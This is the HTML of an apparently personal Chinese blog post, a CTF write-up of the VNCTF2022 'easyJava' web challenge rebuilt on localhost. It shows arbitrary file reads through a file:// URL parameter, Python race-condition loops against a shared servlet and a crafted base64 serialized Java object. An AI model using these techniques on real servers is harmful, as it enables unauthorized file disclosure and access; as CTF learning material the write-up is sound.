@@ -1,0 +1,1148 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='写在前面 第一次把java的题从头到尾做完，整完的时候发现题目并不难。过程中还是学到了很多东西，感谢高表哥和nkk和二师傅🙇‍ 比赛的时候没有做'><title>VNctf2022-easyJava</title>
+
+<link rel='canonical' href='https://example.com/2022/vnctf2022-easyjava/'>
+
+<link rel="stylesheet" href="/scss/style.min.9386c8bee911c8cc9f9c4df385b91100cfdaf1122a331583f740062d4eae78a6.css"><meta property='og:title' content='VNctf2022-easyJava'>
+<meta property='og:description' content='写在前面 第一次把java的题从头到尾做完，整完的时候发现题目并不难。过程中还是学到了很多东西，感谢高表哥和nkk和二师傅🙇‍ 比赛的时候没有做'>
+<meta property='og:url' content='https://example.com/2022/vnctf2022-easyjava/'>
+<meta property='og:site_name' content='k0a1i'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='web' /><meta property='article:tag' content='java' /><meta property='article:published_time' content='2022-03-04T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2023-02-10T00:20:18&#43;08:00'/>
+<meta name="twitter:title" content="VNctf2022-easyJava">
+<meta name="twitter:description" content="写在前面 第一次把java的题从头到尾做完，整完的时候发现题目并不难。过程中还是学到了很多东西，感谢高表哥和nkk和二师傅🙇‍ 比赛的时候没有做"><style>
+    :root {
+        --article-font-family: "Noto Serif SC", var(--base-font-family);
+    }
+</style>
+
+<script> 
+		(function () {
+		    const customFont = document.createElement('link');
+		    customFont.href = "https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@300;700&display=swap"; 
+		    customFont.type = "text/css";
+		    customFont.rel = "stylesheet";
+		
+		    document.head.appendChild(customFont);
+		}());
+</script>
+
+    </head>
+    <body class="
+    article-page
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    <!-- 
+        extended
+     -->
+    on-phone--column extended
+">
+    
+<div id="article-toolbar">
+    <a href="https://example.com" class="back-home">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+        <span>返回</span>
+    </a>
+</div>
+    <aside class="sidebar left-sidebar sticky">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header class="site-info">
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu84895f112c8e6c0fe80c5eecd5e543f0_258028_300x0_resize_q75_box.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <h1 class="site-name"><a href="/">k0a1i</a></h1>
+        <h2 class="site-description">流水不争先,争的是滔滔不绝</h2></header>
+
+    <ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页/Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于/About</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>链接/Links</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档/Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索/Search</span>
+            </a>
+        </li>
+        
+
+        
+            <li id="dark-mode-toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <span>暗色模式</span>
+            </li>
+        
+    </ol>
+</aside>
+
+<main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctf/" style="background-color: #80aba9; color: #fff;">
+                CTF | 端茶送水web手
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/2022/vnctf2022-easyjava/">VNctf2022-easyJava</a>
+    </h2>
+
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Mar 04, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-words">
+                    2143字
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <h3 id="写在前面">写在前面</h3>
+<p>第一次把java的题从头到尾做完，整完的时候发现题目并不难。过程中还是学到了很多东西，感谢高表哥和nkk和二师傅🙇‍</p>
+<p>比赛的时候没有做出来，环境关掉了，虽然buu有复现环境，但是由于需要竞争，buu有限制，所以把源码拿下来在本地搭。</p>
+<h3 id="复现">复现</h3>
+<p>打开环境，F12查看源码</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 132; 
+			flex-basis: 316px"
+	>
+	<a href="/2022/vnctf2022-easyjava/image-20220302133247566.png" data-size="627x475">
+		<img src="/2022/vnctf2022-easyjava/image-20220302133247566.png"
+			width="627"
+			height="475"
+			srcset="/2022/vnctf2022-easyjava/image-20220302133247566_hu577237c865eb4f6abda76ece1a65195e_30892_480x0_resize_box_3.png 480w, /2022/vnctf2022-easyjava/image-20220302133247566_hu577237c865eb4f6abda76ece1a65195e_30892_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="image-20220302133247566">
+	</a>
+	
+	<figcaption>image-20220302133247566</figcaption>
+	
+</figure></p>
+<p>访问/file?</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 291; 
+			flex-basis: 698px"
+	>
+	<a href="/2022/vnctf2022-easyjava/image-20220302133312575.png" data-size="428x147">
+		<img src="/2022/vnctf2022-easyjava/image-20220302133312575.png"
+			width="428"
+			height="147"
+			srcset="/2022/vnctf2022-easyjava/image-20220302133312575_hub564c1c00095b999ecbc42c3dee3dbb9_9145_480x0_resize_box_3.png 480w, /2022/vnctf2022-easyjava/image-20220302133312575_hub564c1c00095b999ecbc42c3dee3dbb9_9145_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="image-20220302133312575">
+	</a>
+	
+	<figcaption>image-20220302133312575</figcaption>
+	
+</figure></p>
+<p>需要传入一个url，猜测是需要用到伪协议任意读文件。于是传入<code>file:///</code>读到源码。本地的话直接知道源码路径，就不多说了。比赛的时候是远程环境，我一开始不知道web部署在哪里，所以找了很久，最后在这个路径里找到。</p>
+<p><code>/file?url=file:///usr/local/tomcat/</code></p>
+<p>看到高表哥是通过当前运行进程去找的，这样找好像快一些，记录一下。</p>
+<p><code>/file?url=file:///proc/self/cwd/</code></p>
+<p>然后看到tomcat的目录结构，进webapps，拿到源码拿去反编译。</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 136; 
+			flex-basis: 326px"
+	>
+	<a href="/2022/vnctf2022-easyjava/image-20220302134240641.png" data-size="301x221">
+		<img src="/2022/vnctf2022-easyjava/image-20220302134240641.png"
+			width="301"
+			height="221"
+			srcset="/2022/vnctf2022-easyjava/image-20220302134240641_hu7b0b6a9bd2b5e77224803dc939a20160_11013_480x0_resize_box_3.png 480w, /2022/vnctf2022-easyjava/image-20220302134240641_hu7b0b6a9bd2b5e77224803dc939a20160_11013_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="image-20220302134240641">
+	</a>
+	
+	<figcaption>image-20220302134240641</figcaption>
+	
+</figure></p>
+<p>HelloWorldServlet类</p>
+<pre><code class="language-java">package servlet;
+
+import entity.User;
+import java.io.IOException;
+import java.util.Base64;
+import javax.servlet.ServletException;
+import javax.servlet.ServletOutputStream;
+import javax.servlet.annotation.WebServlet;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import util.Secr3t;
+import util.SerAndDe;
+
+@WebServlet(name = &quot;HelloServlet&quot;, urlPatterns = {&quot;/evi1&quot;})
+/* loaded from: HelloWorldServlet.class */
+public class HelloWorldServlet extends HttpServlet {
+    private volatile String name = &quot;m4n_q1u_666&quot;;
+    private volatile String age = &quot;666&quot;;
+    private volatile String height = &quot;180&quot;;
+    User user;
+
+    public void init() throws ServletException {
+        this.user = new User(this.name, this.age, this.height);
+    }
+
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
+        String reqName = req.getParameter(&quot;name&quot;);
+        if (reqName != null) {
+            this.name = reqName;
+        }
+        if (Secr3t.check(this.name)) {
+            Response(resp, &quot;no vnctf2022!&quot;);
+        } else if (Secr3t.check(this.name)) {
+            Response(resp, &quot;The Key is &quot; + Secr3t.getKey());
+        }
+    }
+
+    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
+        String key = req.getParameter(&quot;key&quot;);
+        String text = req.getParameter(&quot;base64&quot;);
+        if (!Secr3t.getKey().equals(key) || text == null) {
+            Response(resp, &quot;KeyError&quot;);
+            return;
+        }
+        if (this.user.equals((User) SerAndDe.deserialize(Base64.getDecoder().decode(text)))) {
+            Response(resp, &quot;Deserialize…… Flag is &quot; + Secr3t.getFlag().toString());
+        }
+    }
+
+    private void Response(HttpServletResponse resp, String outStr) throws IOException {
+        ServletOutputStream out = resp.getOutputStream();
+        out.write(outStr.getBytes());
+        out.flush();
+        out.close();
+    }
+}
+</code></pre>
+<p>看到这里发现这个key通过正常手段没有办法拿到，不管怎样都不可能进else的。开始思考有没有别的办法。查阅了一些资料<del>问高表哥之后</del>发现这里需要条件竞争。至于为什么可以竞争，二师傅的猜测加上我的理解再加上y4师傅的<a class="link" href="https://blog.csdn.net/solitudi/article/details/122781947?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164628358416780271539864%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=164628358416780271539864&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-122781947.nonecase&amp;utm_term=servlet&amp;spm=1018.2226.3001.4450"  target="_blank" rel="noopener"
+    >总结</a>，大概就是<strong>servlet在一段时间内只实例化一次，导致多个用户会同时访问到同一个实例</strong>，所以抢在某个servlet实例销毁之前对其进行修改，就可以实现下面两个条件同时满足的情况，进而拿到这个key。</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 481; 
+			flex-basis: 1155px"
+	>
+	<a href="/2022/vnctf2022-easyjava/image-20220303215240491.png" data-size="525x109">
+		<img src="/2022/vnctf2022-easyjava/image-20220303215240491.png"
+			width="525"
+			height="109"
+			srcset="/2022/vnctf2022-easyjava/image-20220303215240491_hu61e8cb75c74514a0672b28dbdb8ff297_7713_480x0_resize_box_3.png 480w, /2022/vnctf2022-easyjava/image-20220303215240491_hu61e8cb75c74514a0672b28dbdb8ff297_7713_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="image-20220303215240491">
+	</a>
+	
+	<figcaption>image-20220303215240491</figcaption>
+	
+</figure></p>
+<p>附上写好的垃圾脚本。</p>
+<p>a.py</p>
+<pre><code class="language-python">import requests
+host = &quot;http://localhost:8080/evi1&quot;
+while True:
+    r = requests.get(host+&quot;?name=qertyyui&quot;)
+</code></pre>
+<p>b.py</p>
+<pre><code class="language-python">import requests
+host = &quot;http://localhost:8080/evi1&quot;
+while True:
+    r = requests.get(host+&quot;?name=vnctf2022&quot;)
+    if r.text.find(&quot;The Key is&quot;)!=-1:
+        print(r.text)
+</code></pre>
+<p>拿到key。</p>
+<ul>
+<li><input disabled="" type="checkbox"> 这里在第二次复现的时候出了一点问题。问题大概出在python的request，在发起请求之后不会自动关闭连接，如果短时间内发起请求过多的话会一直占用Httpconnnectionpool的资源，导致之后发起的请求没有办法成功连接。尝试了很多办法都没有结局，不论是加header的connection为close，还是控制session，都没有用。最后采用多线程的办法才解决。</li>
+</ul>
+<p>接着往下就是反序列化，这里需要post一个key和base64，其中base64是一个User类序列化之后经过base64编码的结果。SerAndDe类里面提供了序列化和反序列化的方法封装，可以直接拿来用。</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 451; 
+			flex-basis: 1083px"
+	>
+	<a href="/2022/vnctf2022-easyjava/image-20220303220931037.png" data-size="1002x222">
+		<img src="/2022/vnctf2022-easyjava/image-20220303220931037.png"
+			width="1002"
+			height="222"
+			srcset="/2022/vnctf2022-easyjava/image-20220303220931037_hu5e7ca04bd1651fd08b88581fc5a4c0aa_20526_480x0_resize_box_3.png 480w, /2022/vnctf2022-easyjava/image-20220303220931037_hu5e7ca04bd1651fd08b88581fc5a4c0aa_20526_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="image-20220303220931037">
+	</a>
+	
+	<figcaption>image-20220303220931037</figcaption>
+	
+</figure></p>
+<p>注意到这里的<code>this.user</code>，我们反序列化出来的User需要和<code>this.user</code>相等。</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 345; 
+			flex-basis: 829px"
+	>
+	<a href="/2022/vnctf2022-easyjava/image-20220304093202982.png" data-size="553x160">
+		<img src="/2022/vnctf2022-easyjava/image-20220304093202982.png"
+			width="553"
+			height="160"
+			srcset="/2022/vnctf2022-easyjava/image-20220304093202982_hu4656b423f200afa2e7b7ea7c1aa4f94b_11450_480x0_resize_box_3.png 480w, /2022/vnctf2022-easyjava/image-20220304093202982_hu4656b423f200afa2e7b7ea7c1aa4f94b_11450_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="image-20220304093202982">
+	</a>
+	
+	<figcaption>image-20220304093202982</figcaption>
+	
+</figure></p>
+<p>那么进User类看看。</p>
+<pre><code class="language-java">package entity;
+
+import java.io.IOException;
+import java.io.ObjectInputStream;
+import java.io.Serializable;
+
+/* loaded from: User.class */
+public class User implements Serializable {
+    private String name;
+    private String age;
+    private transient String height;
+
+    public User(String name, String age, String height) {
+        this.name = name;
+        this.age = age;
+        this.height = height;
+    }
+
+    public String getName() {
+        return this.name;
+    }
+
+    public void setName(String name) {
+        this.name = name;
+    }
+
+    public String getAge() {
+        return this.age;
+    }
+
+    public void setAge(String age) {
+        this.age = age;
+    }
+
+    public String getHeight() {
+        return this.height;
+    }
+
+    public void setHeight(String height) {
+        this.height = height;
+    }
+
+    private void readObject(ObjectInputStream s) throws IOException, ClassNotFoundException {
+        s.defaultReadObject();
+        this.height = (String) s.readObject();
+    }
+
+    @Override // java.lang.Object
+    public boolean equals(Object obj) {
+        if (obj == null) {
+            return false;
+        }
+        if (this == obj) {
+            return true;
+        }
+        if (!(obj instanceof User)) {
+            return false;
+        }
+        User user = (User) obj;
+        if (!user.getAge().equals(this.age) || !user.getHeight().equals(this.height) || !user.getName().equals(this.name)) {
+            return false;
+        }
+        return true;
+    }
+
+    @Override // java.lang.Object
+    public String toString() {
+        return &quot;User{name='&quot; + this.name + &quot;', age='&quot; + this.age + &quot;', height='&quot; + this.height + &quot;'}&quot;;
+    }
+}
+</code></pre>
+<p>这里有一个知识点，对于序列化和反序列化的时候，被<code>transient</code>修饰的变量是不会被序列化的，所以如果不作任何更改序列化出来的字符串再拿去反序列化，得到的height会是个null，这样就没有办法满足if条件，拿不到flag。所以为了反序列化出来时，这个height和<code>this.user</code>里面的height是一致的，可以通过重写writeObject方法，手动把height写进我们反序列化出来的对象里。</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 602; 
+			flex-basis: 1444px"
+	>
+	<a href="/2022/vnctf2022-easyjava/image-20220304094934553.png" data-size="590x98">
+		<img src="/2022/vnctf2022-easyjava/image-20220304094934553.png"
+			width="590"
+			height="98"
+			srcset="/2022/vnctf2022-easyjava/image-20220304094934553_hu60848142f5da1e895606218e686c7fe0_14626_480x0_resize_box_3.png 480w, /2022/vnctf2022-easyjava/image-20220304094934553_hu60848142f5da1e895606218e686c7fe0_14626_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="image-20220304094934553">
+	</a>
+	
+	<figcaption>image-20220304094934553</figcaption>
+	
+</figure></p>
+<ul>
+<li>
+<p><input disabled="" type="checkbox"> 这里又有一个问题，就是在User类里面重写了readObject，这一行代码存在的时候，反序列化一定会失败，但是注释掉之后是可以看到height为null的。</p>
+<pre><code class="language-java">this.height = (String) s.readObject();
+</code></pre>
+</li>
+</ul>
+<p>在User类里面重写一个writeObject</p>
+<pre><code class="language-java">    private void writeObject(ObjectOutputStream s) throws IOException{
+        s.defaultWriteObject();
+        s.writeObject(&quot;180&quot;);
+    }
+</code></pre>
+<p>这样就可以成功进入if判断，拿到flag。</p>
+<p>自己写一个serialize类，输出需要的base64字符串，同时查看一下user2的属性情况。</p>
+<pre><code class="language-java">import java.io.*;
+import java.util.Base64;
+
+import entity.User;
+import util.SerAndDe;
+
+public class serialize {
+    public static void main(String[] args) throws IOException, ClassNotFoundException {
+        User u = new User(&quot;m4n_q1u_666&quot;,&quot;666&quot;,&quot;180&quot;);
+        byte[] user = SerAndDe.serialize(u);
+        String poc = Base64.getEncoder().encodeToString(user);
+        System.out.println(poc);
+        byte[] user2 = Base64.getDecoder().decode(poc);
+        System.out.println(SerAndDe.deserialize(user2).toString());
+    }
+}
+</code></pre>
+<p>结果如下</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 2327; 
+			flex-basis: 5586px"
+	>
+	<a href="/2022/vnctf2022-easyjava/image-20220304100044543.png" data-size="1350x58">
+		<img src="/2022/vnctf2022-easyjava/image-20220304100044543.png"
+			width="1350"
+			height="58"
+			srcset="/2022/vnctf2022-easyjava/image-20220304100044543_hu4221defdfba4abc39916e57b8bc312da_17763_480x0_resize_box_3.png 480w, /2022/vnctf2022-easyjava/image-20220304100044543_hu4221defdfba4abc39916e57b8bc312da_17763_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="image-20220304100044543">
+	</a>
+	
+	<figcaption>image-20220304100044543</figcaption>
+	
+</figure></p>
+<p>本地没有flag，参考le1a师傅的复现过程，在本地弹个计算器。</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 370; 
+			flex-basis: 889px"
+	>
+	<a href="/2022/vnctf2022-easyjava/image-20220304100736444.png" data-size="1119x302">
+		<img src="/2022/vnctf2022-easyjava/image-20220304100736444.png"
+			width="1119"
+			height="302"
+			srcset="/2022/vnctf2022-easyjava/image-20220304100736444_hue25f9f52739079915e00efd0185305a2_57871_480x0_resize_box_3.png 480w, /2022/vnctf2022-easyjava/image-20220304100736444_hue25f9f52739079915e00efd0185305a2_57871_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="image-20220304100736444">
+	</a>
+	
+	<figcaption>image-20220304100736444</figcaption>
+	
+</figure></p>
+<p>payload</p>
+<pre><code>http://127.0.0.1:8080/evi1
+post:key=SjveAUeJxYXPww2Dd0NPwUm90na98of1&amp;base64=rO0ABXNyAAtlbnRpdHkuVXNlcm1aqowD0DcIAwACTAADYWdldAASTGphdmEvbGFuZy9TdHJpbmc7TAAEbmFtZXEAfgABeHB0AAM2NjZ0AAttNG5fcTF1XzY2NnQAAzE4MHg=
+</code></pre>
+<p>大功告成！</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 217; 
+			flex-basis: 522px"
+	>
+	<a href="/2022/vnctf2022-easyjava/image-20220304101021208.png" data-size="1488x683">
+		<img src="/2022/vnctf2022-easyjava/image-20220304101021208.png"
+			width="1488"
+			height="683"
+			srcset="/2022/vnctf2022-easyjava/image-20220304101021208_hud8e2fb32b1bb51a647c35be3823f2bd0_229692_480x0_resize_box_3.png 480w, /2022/vnctf2022-easyjava/image-20220304101021208_hud8e2fb32b1bb51a647c35be3823f2bd0_229692_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="image-20220304101021208">
+	</a>
+	
+	<figcaption>image-20220304101021208</figcaption>
+	
+</figure></p>
+<h3 id="一些奇怪的姿势">一些奇怪的姿势</h3>
+<p>之前没有搭过tomcat，所以在搭建环境的过程中有些吃力。完整的搭建过程之后有空了在搞叭，这里用的办法是用编译好的文件替换掉tomcat自带的ROOT。</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 195; 
+			flex-basis: 469px"
+	>
+	<a href="/2022/vnctf2022-easyjava/image-20220302132904237.png" data-size="497x254">
+		<img src="/2022/vnctf2022-easyjava/image-20220302132904237.png"
+			width="497"
+			height="254"
+			srcset="/2022/vnctf2022-easyjava/image-20220302132904237_hu81ded43b38c768d707b5630daf65ec12_21801_480x0_resize_box_3.png 480w, /2022/vnctf2022-easyjava/image-20220302132904237_hu81ded43b38c768d707b5630daf65ec12_21801_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="image-20220302132904237">
+	</a>
+	
+	<figcaption>image-20220302132904237</figcaption>
+	
+</figure></p>
+<p>在做的过程中发现也可以通过这个办法骗过编译器，当然前提是需要知道类里有哪些方法，否则会出现找不到调用的方法之类的错误。</p>
+<h3 id="参考资料">参考资料</h3>
+<p><a class="link" href="https://www.le1a.com/posts/c1419327/"  target="_blank" rel="noopener"
+    >Le1a师傅的wp</a></p>
+<p><a class="link" href="https://note.tonycrane.cc/assets/images/writeups/vnctf2022/VNCTF%202022%20Official%20WriteUp.pdf"  target="_blank" rel="noopener"
+    >VNCTF 2022 Official WriteUp</a></p>
+<p><a class="link" href="https://blog.csdn.net/u010156024/article/details/48345257?utm_medium=distribute.wap_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_ecpm_v1~rank_v31_ecpm-1-48345257.wap_agg_so&amp;utm_term=volatile%E5%BA%8F%E5%88%97%E5%8C%96"  target="_blank" rel="noopener"
+    >java-Transient关键字、Volatile关键字介绍和序列化、反序列化机制、单例类序列化</a></p>
+<p><a class="link" href="https://blog.csdn.net/solitudi/article/details/122781947?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164636037116780269890558%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=164636037116780269890558&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-122781947.nonecase&amp;utm_term=servlet&amp;spm=1018.2226.3001.4450"  target="_blank" rel="noopener"
+    >Servlet的线程安全问题</a></p>
+<h3 id="写在后面">写在后面</h3>
+<p>这是不知道隔了多久之后重新开始打比赛，并且认认真真地复现。虽然比赛过程中没有做出来，但是成就感满满，也学到了很多东西。作为一名不合格的web手，只能期望日后多push自己一下，好好打比赛好好写题，最重要的是表哥们带带我(●&rsquo;◡&rsquo;●)</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/web/">web</a>
+        
+            <a href="/tags/java/">java</a>
+        
+    </section>
+
+
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            最后更新于 Feb 10, 2023 00:20 CST
+        </span>
+    </section></footer>
+
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">相关文章</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="">
+    <a href="/2022/%E8%93%9D%E5%B8%BD%E6%9D%AF2022/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">蓝帽杯2022</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/2022/dasctfxsuctf-web-writeup/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">DASCTFxSUCTF-web-writeup</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">从一道题学ReDos及SQL盲注</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+     
+        
+    
+
+    <footer class="site-footer">
+
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+
+  <script>
+    (function (u, c) {
+      var d = document, t = 'script', o = d.createElement(t),
+        s = d.getElementsByTagName(t)[0];
